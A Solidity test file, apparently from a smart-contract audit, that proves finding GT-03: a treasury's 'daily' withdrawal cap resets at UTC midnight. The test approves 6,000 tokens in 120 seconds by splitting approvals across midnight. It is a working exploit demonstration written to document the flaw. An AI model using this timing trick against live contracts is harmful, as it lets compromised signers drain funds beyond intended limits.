// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {PocBase} from "./PocBase.sol";

/// @title PoC GT-03: el tope diario se duplica cruzando la medianoche UTC
/// @notice Hallazgo GT-03 (Baja). El día es block.timestamp / 1 days (día calendario UTC),
///         no una ventana de 24 h: 3.000 antes de las 00:00 y 3.000 después salen en minutos.
/// @dev Este test PASA mientras el ataque funcione. Requiere operador y aprobador (o los dos
///      comprometidos): no rompe la doble firma, muestra que el tope de 3.000 "por día" admite
///      6.000 en 120 segundos.
contract PoC_GT03_Medianoche is PocBase {
    /// @notice Seis pedidos de 1.000: tres se aprueban a las 23:59:00 UTC y tres a las 00:01:00 UTC.
    function test_PoC_GT03_SeisMilEnDosMinutosCruzandoMedianoche() public {
        uint256 midnight = (block.timestamp / 1 days + 1) * 1 days;
        vm.warp(midnight - 60); // 23:59:00 UTC

        uint256[6] memory ids;
        for (uint256 i; i < 6; ++i) {
            vm.prank(operator);
            ids[i] = treasury.requestWithdrawal(beneficiary, 1_000e18);
        }

        uint256 start = block.timestamp;
        for (uint256 i; i < 3; ++i) {
            vm.prank(approver);
            treasury.approveWithdrawal(ids[i]);
        }

        vm.warp(midnight + 60); // 00:01:00 UTC del día siguiente
        for (uint256 i = 3; i < 6; ++i) {
            vm.prank(approver);
            treasury.approveWithdrawal(ids[i]);
        }

        assertEq(token.balanceOf(beneficiary), 6_000e18, "salieron 6.000");
        assertEq(block.timestamp - start, 120, "en 120 segundos");
    }
}
